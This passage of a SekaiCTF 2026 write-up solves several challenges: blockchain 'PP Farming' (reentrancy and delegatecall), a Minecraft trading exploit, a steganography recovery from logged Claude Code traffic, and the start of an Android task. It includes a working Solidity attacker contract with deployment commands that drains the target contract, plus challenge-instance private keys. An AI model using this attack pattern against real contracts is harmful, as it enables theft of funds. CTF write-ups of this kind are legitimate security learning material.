transactionHash      0x1eaf87bea08e9ac05bf382f5efec2bffed5d0f4eb9fe2c99aa029f693da4e4b5
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
```

10. Obtaining `contractAdress` of `0x37599472946426785050927D4f4c8120C163F0E0`, we send it to attack() to confirm the success status again

```bash
[helyz@kuro-zephy Blockchain_PP_Farming]$ ~/.foundry/bin/cast send 0x37599472946426785050927D4f4c8120C163F0E0 "attack()" \
	--value 1ether \
	--gas-limit 3000000 \
	--rpc-url $RPC \
	--private-key $PKEY
```

![](Pasted%20image%2020260705190424.png)

We get a `status 1 (success)`!!! Yipee :D

11. Clicked `Get flag` on the Instancer 
   ![](Pasted%20image%2020260705190626.png)

>> 🏳️ Flag Found: SEKAI{3Z_re3ntr4ncy_atTack5}

### [NORMAL] PP Farming 2

Author: brokenappendix

Tags: Ethereum

**Description**

I fixed the issue. I think...

**Note**

Use the pp-farming flag to decrypt the attachment. First solver gets a $100 bounty :)

**Attachments**

1 file, 1.5 KB total

[blockchain_pp-farming-2.7z 1.5 KB](https://sekaictf-2026-files.storage.googleapis.com/uploads/b07edc0fa57698d532e9ebc44f6d13549a3d034a64d4f25481100cb30d6dc36d/blockchain_pp-farming-2.7z)

1. Unzipped the .7z file with the password from the last flag: `SEKAI{3Z_re3ntr4ncy_atTack5}`
   ![](Pasted%20image%2020260706023223.png)

2. Same files given like the first one, 
	1. `Deploy.s.sol`
	2. `PerformancePointATM.sol`

3. Checked `Deploy.s.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-ctf/CTFDeployer.sol";
import "forge-ctf/CTFChallenge.sol";

import "src/PerformancePointATM.sol";

contract Deploy is CTFDeployer {
    function deploy(address system, address player) internal override returns (CTFChallenge[] memory challenges) {
        vm.startBroadcast(system);

        PerformancePointHelper helper = new PerformancePointHelper();
        PerformancePointATM atm = new PerformancePointATM{value: 10 ether}(address(helper));

        challenges = new CTFChallenge[](1);
        challenges[0] = CTFChallenge("PerformancePointATM", address(atm));

        vm.stopBroadcast();
    }
}
```

4. Then the other one, `PerformancePointATM.sol`

```solana
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PerformancePointHelper{
    uint256 id_number;
    address public atm;
    bool public helping;
    constructor() {
        id_number = 0;
        helping = true;
    }
    function processWithdrawal(address payable recipient, uint256 amount) external returns (bool) {
        (bool success, ) = recipient.call{value: amount}("");
        return success;
    }
    function setATM(address _atm) public {
        atm = _atm;
    }
    function stopHelping() public {
        helping = false;
    }
    function startHelping() public {
        helping = true;
    }
}

contract PerformancePointATM {
    mapping(address => uint256) public scores;
    address public performancePointHelper;
    bool public locked;
    constructor(address _performancePointHelper) payable {
        performancePointHelper = _performancePointHelper;
    }

    modifier noReentrancy() {
        require(!locked, "Reentrancy detected");
        locked = true;
        _;
        locked = false;
    }

    function donatePP(address _to) public payable {
        scores[_to] = scores[_to] + msg.value;
    }

    function checkPP(address _who) public view returns (uint256 score) {
        return scores[_who];
    }

    function withdrawPP() public noReentrancy {
        uint256 score = scores[msg.sender];
        require(score > 0, "Nothing to withdraw");
        
        // Uses delegatecall to helper for withdrawal
        (bool success, ) = performancePointHelper.delegatecall(
            abi.encodeWithSignature("processWithdrawal(address,uint256)", msg.sender, score)
        );
        
        require(success, "Transfer failed");
        scores[msg.sender] = 0;
    }


    function isSolved() view public returns (bool) {
        return address(this).balance == 0;
    }

    receive() external payable {}

    // Calls proxy contract
    fallback() external payable {
        address _impl = performancePointHelper;

        bytes4 selector = msg.sig;
        
        // Block withdrawing without proxy
        bytes4 initSelector = bytes4(keccak256("processWithdrawal(address,uint256)"));
        require(selector != initSelector, "processWithdrawal blocked");

        assembly {
            let ptr := mload(0x40) // Get free memory pointer
            calldatacopy(ptr, 0, calldatasize()) // Copy calldata to memory

            let success := delegatecall(gas(), _impl, ptr, calldatasize(), 0, 0) // Delegatecall
            returndatacopy(ptr, 0, returndatasize()) // Copy return data

            if iszero(success) {
                revert(ptr, returndatasize()) // Revert if delegatecall failed
            }
            return(ptr, returndatasize()) // Return data if successful
        }
    }
}
```

5. Same old same old, exporting the given **Instances** again on my bash environment first:
	 1. RPC HTTPS  = `RPC2`
	 2. Player Private Key = `PKEY2`
	 3. Contract: PerformancePointATM = `ATM2`
	
![](Pasted%20image%2020260706025920.png)

```bash
export RPC2="https://eth.chals.sekai.team/rwdEYWvWaybTblvplEjBRJqb/main"
export PKEY2="9b5fad1dd0356e091c782a261bce88d22995327e60e32dadad1f870c26e61418"
export ATM2="0xb1B007AA24fEb5E040858e58ba25674Fac9Fe1E3"
```

6. Cheking balance again, same results as before...
   
![](Pasted%20image%2020260706030625.png)

6. Reimprovised the `PerformancePointATM.sol` again to `atk2.sol`, this time I hardcoded the `ATM2` key (in a state of time-attack panic :P):
   
```solana
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPerformancePointATM {
    function donatePP(address _to) external payable;
    function withdrawPP() external;
    function stopHelping() external;
}

contract Attacker2 {
    IPerformancePointATM public atm = IPerformancePointATM(0xb1B007AA24fEb5E040858e58ba25674Fac9Fe1E3);
    uint256 public attackScore;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "need ETH");
        attackScore = msg.value;
        atm.donatePP{value: msg.value}(address(this));
        atm.withdrawPP();
    }

    receive() external payable {
        if (address(atm).balance >= attackScore) {
            atm.stopHelping();
            atm.withdrawPP();
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "only owner");
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok);
    }
}
```


7. Running the modified script to create again...

```bash
[helyz@kuro-zephy Blockchain_PP_Farming2]$ ~/.foundry/bin/forge create atk2.sol:Attacker2 \
	--rpc-url $RPC2 --private-key $PKEY2 \
	--broadcast
```

![](Pasted%20image%2020260706030728.png)

We have obtained the hash of where it is `Deployed to:`, which is `0xDeB0D8f74E775FBc8bA33d032F9aC5a131E96878`.

8. Since we've obtained the `contractAdress` of `0xDeB0D8f74E775FBc8bA33d032F9aC5a131E96878` again,  as usual:

```bash
[helyz@kuro-zephy Blockchain_PP_Farming]$ ~/.foundry/bin/cast send 0xDeB0D8f74E775FBc8bA33d032F9aC5a131E96878 "attack()" \
	--value 1ether \
	--gas-limit 5000000 \
	--rpc-url $RPC2 \
	--private-key $PKEY2
```

Full output was:

![](Pasted%20image%2020260706030911.png)

`status` is now `1 (success)`

8. Just to confirm the status if it actually`isSolved()`, this will return a boolean. Status is `true` !!!

![](Pasted%20image%2020260706031106.png)

9. Went back to the instancer, smashed the `Get flag` button, and obtained the flag!

![](Pasted%20image%2020260706031208.png)

>> 🏳️ Flag Found: SEKAI{pr0xie5_4r3_h4rD_2_3t4k3}

## Miscellaneous

### [EASY] skyblock

Author: es3n1n, Pindos

Tags: Minecraft

**Description**

Sekai craft got a spinoff, which is... a _very_ cheap version of skyblock!

We even implemented the automated liquidity offers in `/tradebook` for both buying and selling! I wonder if we priced everything correctly though...

s/o to our friends that helped with building everything: SKVLLZ, rainedot, whiteydark

**Minecraft version:** 26.1.2

**Connection**

`skyblock.chals.sekai.team:25565`

1. We playin Minecraft now!!! :D 
   
   ![](Pasted%20image%2020260711025137.png)   
   ![](Pasted%20image%2020260711025152.png)
   *~server ded coz CTF ended already*

2. Creating a new password, most likely using **AuthMeReloaded** plugin. My creds were `helyz:poopfart123` :P
   
   ![](Pasted%20image%2020260711025248.png)

3. helyz has joined the world! Found:
   
   - Welcoming message with commands, take note of the `/tradebook` command 
     ![](Pasted%20image%2020260711030230.png)
   
   - an interesting notice board 
   ![](Pasted%20image%2020260711025627.png)
   
- parkour civilization 
  ![](Pasted%20image%2020260711025900.png)![](Pasted%20image%2020260711025914.png)

4. Ok, lets get to the real deal of searching the flag :P
   
   Here's when I found a **Flag Merchant** shop.
   ![](Pasted%20image%2020260711030043.png)
   
   He was only selling a **Flag Key** for the cost of **1,000,000 coins**.
   
   ![](Pasted%20image%2020260711030139.png)

5. When I used the command, `/tradebook`, lots of items popped up for **liquidity trading**. 
   
   ![](Pasted%20image%2020260711030414.png)

You can **sell stuff at any price**, only if its **not a resource item** (like diamonds), as they **can only be sold by their respective Merchants**. I saw:

- Miner Merchant
- FIshing Merchant
- Farming Merchant
- Flag Merchant

6. I tried to sell one of my items, to test it out. 

![](Pasted%20image%2020260711030710.png)

Got my money back, as advertised.

![](Pasted%20image%2020260711030755.png)

7. The solution is that, you go buy a **fishing rod** at the **Fishing Merchant**, then resell it.
   ![](Pasted%20image%2020260711030937.png)
   ![](Pasted%20image%2020260711030919.png)
   
   Sold it for 1,110,101 coins (random binary lol)

   ![](Pasted%20image%2020260711031121.png)![](Pasted%20image%2020260711031147.png)
   
8. Purchased the flag :3  
   ![](Pasted%20image%2020260711031255.png)
   
>> 🏳️ Flag Found: SEKAI{sekai-craft-is-back-in-business-:sunglasses:}

### [EASY] impossible stego

Author: sy1vi3
Tags: Stego

**Description**
i rolled my own stego and made sure to make it wayyyyy too hard for someone to guess how it works...

er, i mean claude did. i totally read the code tho.

**Attachments**
1 file, 11 MB total
[misc_impossible-stego.tar.gz 11 MB](https://sekaictf-2026-files.storage.googleapis.com/uploads/fa71eacff0710f426ea65a419c917044d2915d3e2a31dc11a8bead44f72aa781/misc_impossible-stego.tar.gz)

1. We first unzip the file to take a peek of whats inside... we get 2 files:
   ![](Pasted%20image%2020260709212906.png)

2. Checking out `messages.log`, seems that the whole message is decrypted in Base64. Decoded it and the deets were in `.json`, these are basically a **full traffic capture from Claude Code**:
   
```json
[
  {
    "path": "/",
    "method": "HEAD",
    "req_headers": {
      "connection": "keep-alive",
      "user-agent": "Bun/1.4.0",
      "accept": "*/*",
      "host": "ai-gateway.sekai.team",
      "accept-encoding": "gzip, deflate, br, zstd"
    },
    "res_headers": {
      "Date": "Fri, 26 Jun 2026 23:44:27 GMT",
      "Content-Type": "text/plain;charset=UTF-8",
      "Connection": "keep-alive",
      "Content-Encoding": "gzip",
      "Server": "cloudflare",
      "CF-RAY": "603ba5248baf21bf-IAD",
      "Server-Timing": "cfReqDur;dur=26.307",
      "Cf-Team": "2271b16930fec630001b5619426fda8d"
    },
    "req_body": "",
    "resp_body": ""
  },
  {
    "path": "v1/models",
    "method": "GET",
    "req_headers": {
      "user-agent": "claude-code/2.1.195",
      "anthropic-version": "2023-06-01",
      "x-api-key": "sk-ant-api03-meowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeow",
      "connection": "keep-alive",
      "accept": "*/*",
      "host": "ai-gateway.sekai.team",
      "accept-encoding": "gzip, deflate, br, zstd"
    },
    "res_headers": {
      "Date": "Fri, 26 Jun 2026 23:44:28 GMT",
      "Content-Type": "application/json",
      "Transfer-Encoding": "chunked",
      "Connection": "keep-alive",
      "Server": "cloudflare",
      "CF-RAY": "603ba52b3cbd21bf-IAD",
      "Content-Encoding": "gzip"
    },
    "req_body": "",
    "resp_body": {
      "data": [
        {
          "type": "model",
          "id": "claire-meowthos-5",
          "display_name": "Claire Meowthos 5",
          "created_at": "2026-06-07T00:00:00Z",
          "max_input_tokens": 1000000,
          "max_tokens": 128000,
          "capabilities": {
            "batch": {"supported": true},
            "citations": {"supported": true},
            "code_execution": {"supported": true},
            "context_management": {
              "supported": true,
              "clear_tool_uses_20250919": {"supported": true},
              "clear_thinking_20251015": {"supported": true},
              "compact_20260112": {"supported": true}
            },
            "effort": {
              "supported": true,
              "low": {"supported": true},
              "medium": {"supported": true},
              "high": {"supported": true},
              "xhigh": {"supported": true},
              "max": {"supported": true}
            },
            "image_input": {"supported": true},
            "pdf_input": {"supported": true},
            "structured_outputs": {"supported": true},
            "thinking": {
              "supported": true,
              "types": {
                "enabled": {"supported": false},
                "adaptive": {"supported": true}
              }
            }
          }
        },
        {
          "type": "model",
          "id": "claire-meowthos-preview",
          "display_name": "Claude Opus 4.8",
          "created_at": "2026-05-28T00:00:00Z",
          "max_input_tokens": 1000000,
          "max_tokens": 128000,
          "capabilities": {}
        },
        {
          "type": "model",
          "id": "claude-opus-4-7",
          "display_name": "Claude Opus 4.7",
          "created_at": "2026-04-14T00:00:00Z",
          "max_input_tokens": 1000000,
          "max_tokens": 128000,
          "capabilities": {}
        },
        {
          "type": "model",
          "id": "claire-meowthos-preview",
          "display_name": "Claire Meowthos Preview",
          "created_at": "2026-04-06T00:00:00Z",
          "max_input_tokens": 1000000,
          "max_tokens": 128000,
          "capabilities": {}
        },
        {
          "type": "model",
          "id": "claude-sonnet-4-6",
          "display_name": "Claude Sonnet 4.6",
          "created_at": "2026-02-17T00:00:00Z",
          "max_input_tokens": 1000000,
          "max_tokens": 128000,
          "capabilities": {}
        },
        {
          "type": "model",
          "id": "claude-opus-4-6",
          "display_name": "Claude Opus 4.6",
          "created_at": "2026-02-04T00:00:00Z",
          "max_input_tokens": 1000000,
          "max_tokens": 128000,
          "capabilities": {}
        },
        {
          "type": "model",
          "id": "claude-opus-4-5-20251101",
          "display_name": "Claude Opus 4.5",
          "created_at": "2025-11-24T00:00:00Z",
          "max_input_tokens": 2000000,
          "max_tokens": 64000,
          "capabilities": {}
        },
        {
          "type": "model",
          "id": "claude-haiku-4-5-20251001",
          "display_name": "Claude Haiku 4.5",
          "created_at": "2025-10-15T00:00:00Z",
          "max_input_tokens": 2000000,
          "max_tokens": 64000,
          "capabilities": {}
        },
        {
          "type": "model",
          "id": "claude-sonnet-4-5-20250929",
          "display_name": "Claude Sonnet 4.5",
          "created_at": "2025-09-29T00:00:00Z",
          "max_input_tokens": 1000000,
          "max_tokens": 64000,
          "capabilities": {}
        },
        {
          "type": "model",
          "id": "claude-opus-4-1-20250805",
          "display_name": "Claude Opus 4.1",
          "created_at": "2025-08-05T00:00:00Z",
          "max_input_tokens": 2000000,
          "max_tokens": 32000,
          "capabilities": {}
        }
      ],
      "has_more": false,
      "first_id": "claire-meowthos-5",
      "last_id": "claude-opus-4-1-20250805"
    }
  },
  {
    "path": "v1/messages",
    "method": "POST",
    "req_headers": {
      "user-agent": "claude-cli/2.1.195 (external, cli)",
      "anthropic-version": "2023-06-01",
      "x-api-key": "sk-ant-api03-meowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeow",
      "content-type": "application/json",
      "accept": "text/event-stream",
      "connection": "keep-alive",
      "host": "ai-gateway.sekai.team",
      "accept-encoding": "gzip, deflate, br, zstd"
    },
    "res_headers": {
      "Date": "Fri, 26 Jun 2026 23:46:24 GMT",
      "Content-Type": "text/event-stream; charset=utf-8",
      "Transfer-Encoding": "chunked",
      "Connection": "keep-alive",
      "Cache-Control": "no-cache",
      "X-Accel-Buffering": "no",
      "Server": "cloudflare",
      "CF-RAY": "603ba7fbaaa021bf-IAD"
    },
    "req_body": {
      "model": "claude-haiku-4-5-20251001",
      "messages": [
        {
          "role": "user",
          "content": [
            {
              "type": "text",
              "text": "<session>\nwrite a python program that takes an input string and an image and hides the string recoverably in the image. make it complicated and impossible to guess what the algorithm is without having the source code of the program. make sure the output image remains looking as close to identical as possible. you can use the image i left in this folder for testing.\n</session>\n\nWrite the title in the language the user wrote in, regardless of the language of the examples above."
            }
          ]
        }
      ],
      "system": [
        {
          "type": "text",
          "text": "x-anthropic-billing-header: cc_version=2.1.195; cc_entrypoint=cli;"
        },
        {
          "type": "text",
          "text": "You are Claude Code, Anthropic's official CLI for Claude."
        },
        {
          "type": "text",
          "text": "Generate a concise, sentence-case title (3-7 words) that captures the main topic or goal of this coding session. The title should be clear enough that the user recognizes the session in a list. Use sentence case: capitalize only the first word and proper nouns.\n\nThe session content is provided inside <session>..."
        }
      ]
    },
    "resp_body": "event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"} }\n\nevent: ping\ndata: {\"nonce\": \"405f0d\", \"type\": \"ping\"}\n\nevent: content_block_delta\ndata: {\"nonce\": \"405f0d\", \"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"del\"}            }\n\nevent: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"ete secret.png\"}        }\n\nevent: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\nevent: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"end_turn\",\"stop_sequence\":null},\"usage\":{\"output_tokens\":6} }\n\nevent: message_stop\ndata: {\"type\":\"message_stop\"}"
  }
]
```

3. From the logs, we know that from:
   - Entry 1 **(GET v1/models)** gave a **Model Routing Leak**:
```json
{
  "id": "claire-meowthos-preview",
  "display_name": "Claude Opus 4.8"
}
```

This confirms that the model routing leak, called `claire-meowthos-preview` was routed to the real one, which is Opus, not meowthos, *~nya*

- Entry 2 (**POST v1/messages)** gave:
```json
"req_headers": {
      "user-agent": "claude-cli/2.1.195 (external, cli)",
      "anthropic-version": "2023-06-01",
      "x-api-key": "sk-ant-api03-meowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeowmeow",
      "content-type": "application/json",
      "accept": "text/event-stream",
      "connection": "keep-alive",
      "host": "ai-gateway.sekai.team",
      "accept-encoding": "gzip, deflate, br, zstd"
    }
```

Where it leaked `x-api-key`, *and so I thought*...

- At the end, `resp_body` gave:

```json
{
	"resp_body": "event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"} }\n\nevent: ping\ndata: {\"nonce\": \"405f0d\", \"type\": \"ping\"}\n\nevent: content_block_delta\ndata: {\"nonce\": \"405f0d\", \"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"del\"}            }\n\nevent: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"ete secret.png\"}        }\n\nevent: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\nevent: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"end_turn\",\"stop_sequence\":null},\"usage\":{\"output_tokens\":6} }\n\nevent: message_stop\ndata: {\"type\":\"message_stop\"}"
}
```

It's **NOT A JSON** object, it's a **Server Sent Event (SSE)** stream.

So far, only **Entry 1** and `resp_body` matters. Others are just bullcrap :<

4. Parsing the proper SSE stream, I only focus on the `data` information, as others are obsolete.

There are 5 `type` fields, which will reveal the information that i need:
- `content_block_start`
- `content_block_delta`
- `content_block_stop`
- `messages_data`
- `ping` (ignore)

Here's the parsing script:

```python
import json
import base64

def parse_SSEGS(raw_text):
    blocks = {}
    for line in raw_text.split('\n'):
        if not line.startswith('data: '):
            continue
        try:
            data = json.loads(line[6:])
        except:
            continue

        t = data.get('type', '')

        if t == 'content_block_start':
            idx = data['index']
            cb  = data['content_block']
            blocks[idx] = {
                'type': cb['type'],
                'name': cb.get('name', ''),
                'text': '',
                'partial_json': ''
            }

        elif t == 'content_block_delta':
            idx   = data['index']
            delta = data['delta']
            dtype = delta.get('type', '')

            if dtype == 'text_delta':
                blocks.setdefault(idx, {'type':'text','name':'','text':'','partial_json':''})
                blocks[idx]['text'] += delta.get('text', '')

            elif dtype == 'input_json_delta':
                blocks.setdefault(idx, {'type':'tool_use','name':'','text':'','partial_json':''})
                blocks[idx]['partial_json'] += delta.get('partial_json', '')

    return blocks

with open('messages.log') as f:
    entries = [json.loads(line) for line in f]

for i, entry in enumerate(entries):
    if entry['method'] != 'POST':
        continue

    resp_b64 = entry.get('resp_body', '')
    if not resp_b64 or not isinstance(resp_b64, str):
        continue

    raw = base64.b64decode(resp_b64).decode('utf-8', errors='replace')
    blocks = parse_SSEGS(raw)

    for idx in sorted(blocks):
        b = blocks[idx]
        if b['type'] == 'tool_use' and b['name'] in ('Write', 'Edit'):
            inp = json.loads(b['partial_json'])
            fp  = inp.get('file_path', '')
            print(f"[Entry {i}] {b['name']} → {fp}")
```
*~did u notice it? ;)*

Full output:

![](Pasted%20image%2020260711213020.png)

5. From the log result, I went ahead and created a script to reconstruct all the files created by claude, given the PATH `/home/claude/projects/impossible-stego/` :

```python
import os
import json
import base64

BASE = "/home/claude/projects/impossible-stego/"  # as received from prev. step

def parse_sse(raw):
    blocks = {}
    for line in raw.split('\n'):
        if not line.startswith('data: '):
            continue
        try:
            data = json.loads(line[6:])
        except:
            continue
        t = data.get('type','')
        if t == 'content_block_start':
            idx = data['index']
            cb  = data['content_block']
            blocks[idx] = {'type':cb['type'],'name':cb.get('name',''),'text':'','partial_json':''}
        elif t == 'content_block_delta':
            idx   = data['index']
            delta = data['delta']
            dtype = delta.get('type','')
            if dtype == 'text_delta':
                blocks.setdefault(idx,{'type':'text','name':'','text':'','partial_json':''})
                blocks[idx]['text'] += delta.get('text','')
            elif dtype == 'input_json_delta':
                blocks.setdefault(idx,{'type':'tool_use','name':'','text':'','partial_json':''})
                blocks[idx]['partial_json'] += delta.get('partial_json','')
    return blocks

with open('messages.log') as f:
    entries = [json.loads(l) for l in f]

for i, entry in enumerate(entries):
    if entry['method'] != 'POST':
        continue
    resp_b64 = entry.get('resp_body','')
    if not resp_b64 or not isinstance(resp_b64, str):
        continue
    raw    = base64.b64decode(resp_b64).decode('utf-8','replace')
    blocks = parse_sse(raw)

    for idx in sorted(blocks):
        b = blocks[idx]
        if b['type'] != 'tool_use':
            continue
        try:
            inp = json.loads(b['partial_json'])
        except:
            continue

        fp = inp.get('file_path', inp.get('path',''))
        
        if fp.startswith(BASE):
            fp = fp[len(BASE):]
        else:
            continue

        if b['name'] == 'Write':
            content = inp.get('content','')
            if os.path.dirname(fp):
                os.makedirs(os.path.dirname(fp), exist_ok=True)
            with open(fp, 'w') as out:
                out.write(content)
            print(f"[{i}] Write → {fp}")

        elif b['name'] == 'Edit':
            old = inp.get('old_string','')
            new = inp.get('new_string','')
            try:
                with open(fp,'r') as f2:
                    src = f2.read()
                with open(fp,'w') as f2:
                    f2.write(src.replace(old, new, 1))
                print(f"[{i}] Edit  → {fp}")
            except FileNotFoundError:
                print(f"[{i}] Edit SKIP (file not found) → {fp}")
```

Full result:

![](Pasted%20image%2020260711213827.png)

6. A new `stego/` directory has been created, the file tree is:

![](Pasted%20image%2020260711214720.png)

- Found something very important in `stego/pipeline.py` too:

```python
"""
pipeline.py — the full embed/extract orchestration.

Embed transforms, in order:

    message
      -> build_frame            (MAGIC|VER|LEN|DATA|CRC32)
      -> ChaCha20 encrypt       (image-bound key + nonce)
      -> keyed S-box substitute (confusion)
      -> positional whitening   (diffusion)
      -> append HMAC tag        (authentication)
      -> scatter bits into RGB carrier slots via keyed Fisher-Yates
      -> +/-1 matched LSB write  (alpha untouched)

Extract reverses every step, authenticates with the tag, and validates the
frame's CRC and magic.  All keys derive from the baked-in secret bound to the
image geometry — there is no passphrase.
"""

from .crypto import KeySchedule, ChaCha20, Csprng, compute_tag, verify_tag
from .coding import build_frame, parse_frame, Sbox, whiten, unwhiten
from .coding.frame import HEADER_LEN, CRC_LEN, parse_header, FrameError
from .image import Carrier, slot_order, embed_bits, extract_bits
from .bits import bytes_to_bits, bits_to_bytes
from . import secret


class StegoError(Exception):
    pass


def _coin_seed(schedule: KeySchedule) -> bytes:
    # Direction of each +/-1 nudge; need not be recoverable, only deterministic.
    return schedule.derive(b"stego/v2/match-coin", 32)


def _forward_code(schedule: KeySchedule, frame: bytes) -> bytes:
    """frame -> chacha -> sbox -> whiten."""
    ct = ChaCha20(schedule.cipher_key(), schedule.nonce()).encrypt(frame)
    ct = Sbox(schedule.sbox_key()).apply(ct)
    ct = whiten(schedule.whiten_key(), ct)
    return ct


def _reverse_code(schedule: KeySchedule, blob: bytes) -> bytes:
    """whiten -> sbox -> chacha (position-aligned, so prefixes work too)."""
    x = unwhiten(schedule.whiten_key(), blob)
    x = Sbox(schedule.sbox_key()).invert(x)
    x = ChaCha20(schedule.cipher_key(), schedule.nonce()).decrypt(x)
    return x


def embed(in_path: str, out_path: str, message: bytes) -> None:
    carrier = Carrier(in_path)
    schedule = KeySchedule(carrier.width, carrier.height, carrier.channels)

    coded = _forward_code(schedule, build_frame(message))
    blob = coded + compute_tag(schedule.mac_key(), coded)

    nbits = len(blob) * 8
    if nbits > carrier.capacity_bits:
        raise StegoError(
            f"message too large: needs {nbits} bits, capacity {carrier.capacity_bits}"
        )

    order = slot_order(schedule.scatter_key(), carrier.capacity_bits)
    coin = Csprng(_coin_seed(schedule))
    embed_bits(carrier, order, bytes_to_bits(blob), coin)
    carrier.save(out_path)


def extract(in_path: str) -> bytes:
    carrier = Carrier(in_path)
    schedule = KeySchedule(carrier.width, carrier.height, carrier.channels)
    order = slot_order(schedule.scatter_key(), carrier.capacity_bits)

    # Step 1: recover just the header to learn the payload length.
    header_cipher = bits_to_bytes(extract_bits(carrier, order, HEADER_LEN * 8))
    try:
        header_plain = _reverse_code(schedule, header_cipher)
        data_len = parse_header(header_plain)
    except FrameError as exc:
        raise StegoError(f"no recoverable payload ({exc})") from None

    frame_len = HEADER_LEN + data_len + CRC_LEN
    blob_len = frame_len + secret.TAG_LEN
    if blob_len * 8 > carrier.capacity_bits:
        raise StegoError("declared length exceeds image capacity")

    # Step 2: read the whole blob, authenticate, then decode.
    blob = bits_to_bytes(extract_bits(carrier, order, blob_len * 8))
    coded, tag = blob[:frame_len], blob[frame_len:]
    if not verify_tag(schedule.mac_key(), coded, tag):
        raise StegoError("authentication failed (not a valid stego image)")

    try:
        frame = _reverse_code(schedule, coded)
        return parse_frame(frame)
    except FrameError as exc:
        raise StegoError(f"frame decode failed ({exc})") from None
```

THIS IS IT!!! It contains the `extract()` function, which literally *cooks* the flag for us. But internally, seems that it imports everything else in the folder in order for it to work. 


*Like a cherry on the cake, OwO*


- ALSO, `stego/secret.py` had the key to it:

```python
"""
secret.py — the baked-in algorithmic secrets.

Per design, ALL security lives in the algorithm: there is no passphrase.
Everything an attacker would need to recover the payload is derived from the
constants in this file combined with the cover image's own dimensions.  Without
this exact source, the key schedule, cipher nonce, S-box and scatter pattern
are unknowable.
"""

# 64-byte root secret.  Fed into the HKDF-style key schedule (see crypto.kdf).
ROOT_SECRET = bytes.fromhex(
    "9f3c1ad77be20415c6a8e0d2473b5f812e6498af0c7d13569b8e4a210fcd7e35"
    "0b71d4e8a93c25f6178d6ae0c4b39f52d80a17e36cf4928b5a0e1d7c63840fb9"
)

# Independent salts for the extract/expand phases of key derivation.
EXTRACT_SALT = bytes.fromhex("c4f1e009ab7d3325be6610f29d4a7c81")
EXPAND_SALT = bytes.fromhex("17be40d9c2a85f3361049e7daf28cb50")

# Seed used to grow the keyed bijective S-box (see coding.sbox).
SBOX_SEED = bytes.fromhex("6d2a9fe4c70b15883ad1ce62740bf99e")

# Frame identity.  MAGIC is checked after decryption to confirm a clean recover.
MAGIC = b"\x53\x6b\x47\x32"          # "SkG2"
VERSION = 2

# Domain-separation labels for the key schedule.  Changing any of these
# silently invalidates all previously embedded images.
LABEL_CIPHER = b"stego/v2/chacha20-stream-key"
LABEL_NONCE = b"stego/v2/chacha20-nonce"
LABEL_MAC = b"stego/v2/hmac-authentication"
LABEL_SBOX = b"stego/v2/sbox-permutation"
LABEL_WHITEN = b"stego/v2/positional-whitening"
LABEL_SCATTER = b"stego/v2/pixel-slot-scatter"

# Per-round sub-labels for the multi-stage scatter (see image/scatter.py).
# Each derives an independent sub-key so every shuffle round is keyed
# differently; their composition is still a single bijection over all slots.
LABEL_SCATTER_ROUNDS = (
    b"stego/v2/scatter/round-0/block-interleave",
    b"stego/v2/scatter/round-1/keyed-rotate",
    b"stego/v2/scatter/round-2/feistel-mix",
    b"stego/v2/scatter/round-3/fisher-yates",
)

# Only R, G, B are ever used as carriers; alpha is preserved bit-for-bit.
CARRIER_CHANNELS = 3

# Authentication tag length in bytes (truncated HMAC-SHA256).
TAG_LEN = 16
```

From the code, it literally gives us the hardcoded `ROOT_SECRET` that is encrypted in hex, to decode! Wowie...

7. Since we've got every info I need, time to craft the extraction script for the flag, `旗取り.py`:

```python
import sys
sys.path.insert(0, '.')

from stego.pipeline import extract

flag = extract('flag.png')
print(flag.decode())
```

Full output:

![](Pasted%20image%2020260711220743.png)

>> 🏳️ Flag Found: SEKAI{th3y_d1dn7_4ctually_l3t_m3_us3_my7h0s_f0r_7h1s_0n3_s4dly_i_h4d_i7_r3r0ut3d_t0_0pus}
### [HARD] Sekai ID

Author: Marc

Tags: Sekai

**Description:**

Planning to attend the SEKAI Conference? Download the official SEKAI ID apps to receive and manage your digital conference credential.

**Note**
- This is an Android exploitation challenge.
- Your goal is to create a working exploit application (`.apk`).
- Once you have a working exploit, you can spawn an instance that provides ADB access.
- Use ADB to install and run your exploit on the provided device.
- Using `scrcpy` is recommended for interacting with the device.
- It can take up to 5 minutes for the instance to become available, please be patient

**Tip**

Our instancer serves connections with SSL TCP, use `tls_proxy.py` to start a local non-ssl tcp server

**Attachments**

1 file, 20 MB total

[misc_sekaiid.tar.gz 20 MB](https://sekaictf-2026-files.storage.googleapis.com/uploads/82be49ce47155437fa3d2fc83482526e703386ad0ff12dca2bf74db0de9f1de0/misc_sekaiid.tar.gz)

1. Unzipped the files and connected to TLS Proxy
   ![](Pasted%20image%2020260705061742.png)
   
2. Connecting adb thru the proxy on another terminal
    ![](Pasted%20image%2020260705063459.png)

3. Start screen mirroring with `scrcpy` 
   ![](Pasted%20image%2020260705063754.png)

4. The challenge did mention on crafting an exploit, but its not really necessary when you have `scrcpy`, much more easier navigating thru the app UI. (unintended cheezed solution I guess lol)

5. Performed the installation of the 2 files 
   
   ![](Pasted%20image%2020260705064025.png)

